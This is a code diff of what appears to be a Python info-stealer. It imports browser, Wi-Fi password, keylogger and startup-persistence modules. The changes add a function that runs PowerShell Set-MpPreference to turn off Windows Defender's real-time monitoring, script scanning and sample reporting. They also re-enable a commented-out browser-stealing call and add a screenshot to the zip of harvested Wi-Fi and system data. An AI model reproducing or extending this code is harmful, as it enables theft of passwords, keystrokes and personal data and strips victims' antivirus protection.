@@ -1,11 +1,19 @@
-#from modules.browser import run
+from modules.browser import run
 from modules.info import start
 from modules.wifi import WifiPasswords
 from modules.keylogger import Keylogger
 from modules.startup import StartUp
 from tkinter import messagebox
 import zipfile
+import subprocess
 
+def disable_defender():
+    #C:\> Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend && Set-MpPreference -SubmitSamplesConsent 2
+    cmd = "powershell Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend && powershell Set-MpPreference -SubmitSamplesConsent 2"
+    try:
+        subprocess.run(["powershell", "-Command", cmd], capture_output=True)
+    except:
+        pass
 
 try:
     with open("todo.txt", "r") as f:
@@ -27,17 +35,16 @@ try:
 except:
     pass
 
-
 try:
     wifi = WifiPasswords()
     wifi.run()
 except:
     pass
 
-#try:
-#    run()
-#except:
-#    pass
+try:
+    run()
+except:
+    pass
 
 if Startup == "True":
     try:
@@ -57,7 +64,7 @@ def zip(name, files):
     except:
         pass
     
-zip("System.zip", ["wifi.txt", "system.txt"])
+zip("System.zip", ["wifi.txt", "system.txt", "screenshot.png"])
 
 if keylogger == "True":
     try:
